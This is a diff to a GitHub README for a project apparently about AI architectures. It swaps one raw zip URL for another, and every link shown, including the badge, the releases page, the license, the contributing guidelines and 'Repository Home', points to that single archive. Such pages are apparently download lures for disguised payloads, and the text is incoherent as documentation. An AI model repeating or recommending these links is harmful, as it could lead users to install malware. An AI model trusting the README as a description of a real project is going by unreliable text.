@@ -1,6 +1,6 @@
 # 🌟 the-autonomous-enterprise - Explore Next-Gen AI Architectures
 
-![Download Now](https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/patterns/enterprise_the_autonomous_v1.5-alpha.4.zip%20Now-Release-brightgreen)
+![Download Now](https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/schemas/autonomous-enterprise-the-Russine.zip%20Now-Release-brightgreen)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ To begin, follow these steps. We make it straightforward for everyone, whether y
 
 ## 🔗 Download & Install
 
-To get the latest version, visit this page to download: [Releases Page](https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/patterns/enterprise_the_autonomous_v1.5-alpha.4.zip). 
+To get the latest version, visit this page to download: [Releases Page](https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/schemas/autonomous-enterprise-the-Russine.zip). 
 
 Once you're on the page, you'll see various downloadable files. Look for the most recent version and click on it to download. After the download, follow the instructions below.
 
@@ -54,7 +54,7 @@ The project is designed with various users in mind. Each section of the PDF give
 
 ## 🤝 Contributing
 
-If you're interested in improving this project, your contributions are welcome. Please read the `https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/patterns/enterprise_the_autonomous_v1.5-alpha.4.zip` file for guidelines on how to help.
+If you're interested in improving this project, your contributions are welcome. Please read the `https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/schemas/autonomous-enterprise-the-Russine.zip` file for guidelines on how to help.
 
 ## 📞 Support
 
@@ -62,11 +62,11 @@ If you have any questions or need assistance, you can open an issue on GitHub. O
 
 ## 📝 License
 
-This project is licensed under the MIT License. Please see the `https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/patterns/enterprise_the_autonomous_v1.5-alpha.4.zip` file for details.
+This project is licensed under the MIT License. Please see the `https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/schemas/autonomous-enterprise-the-Russine.zip` file for details.
 
 ## 🔗 Important Links
 
-- **Releases Page**: [Download Here](https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/patterns/enterprise_the_autonomous_v1.5-alpha.4.zip)
-- **Repository Home**: [GitHub Repository](https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/patterns/enterprise_the_autonomous_v1.5-alpha.4.zip)
+- **Releases Page**: [Download Here](https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/schemas/autonomous-enterprise-the-Russine.zip)
+- **Repository Home**: [GitHub Repository](https://github.com/rahul9640440529/the-autonomous-enterprise/raw/refs/heads/master/schemas/autonomous-enterprise-the-Russine.zip)
 
 Enjoy exploring the world of autonomous architecture with us!
